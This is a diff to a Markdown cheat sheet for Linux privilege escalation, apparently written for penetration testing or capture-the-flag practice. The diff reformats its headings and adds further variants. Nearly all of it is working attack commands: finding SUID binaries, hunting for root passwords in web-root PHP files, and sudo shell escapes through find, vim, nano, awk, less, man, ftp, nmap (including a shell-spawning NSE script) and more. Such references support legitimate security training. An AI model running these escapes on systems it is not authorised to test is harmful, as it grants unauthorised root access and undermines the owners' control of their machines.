@@ -69,7 +69,7 @@ ps aux
 - No hashes in `/etc/shadow` is another pretty good indicator
 #### Database files
 - Make sure to look for any passwords for the root user in .php files in web root!
-#### Quick SUID Find
+#### Quick SUID 
 - The following command can be used to find all SUID programs on a given system:
 ````
 find /* -user root -perm -4000 -print 2>/dev/null
@@ -239,45 +239,51 @@ uid=0(root) gid=0(root) groups=0(root)
 ````
 Sudo -l
 ````
-- iftop
+#### iftop
 ````
 sudo /usr/bin/iftop
 !/bin/bash #hit enter
 ````
-- find
+#### find
 ````
 sudo /usr/bin/find . -exec /bin/bash \; -quit
+sudo /find /bin -name nano -exec /bin/sh \;
 ````
-- nano
+#### nano
 ````
 sudo /usr/bin/nano
 Press ctrl+r then ctrl +x 
 Reset; bash 1>&0 2>&0
 ````
-- vim
+#### vim
 ````
 Sudo vim -c ‘:!/bin/bash’
 ````
-- man
+- Method 2
+````
+sudo vim -c '!sh'
+````
+#### man
 ````
 sudo /usr/bin/man man
 !/bin/sh
 ````
-- awk
+#### awk
 ````
 sudo awk 'BEGIN {system("/bin/bash")}'
+sudo awk 'BEGIN {system("/bin/sh")}'
 ````
-- less
+#### less
 ````
 sudo /usr/bin/less /etc/profile
 !/bin/sh
 ````
-- FTP
+#### FTP
 ````
 sudo /usr/bin/ftp
 !/bin/bash
 ````
-- NMAP
+#### NMAP
 - Method 1
 ````
 TF=$(mktemp)
@@ -289,7 +295,11 @@ sudo nmap --script=$TF
 sudo nmap --interactive
 !bash
 ````
-- more
+- Method 3
+````
+echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+````
+#### more
 ````
 TERM= sudo -E more /etc/profile
 !/bin/bash
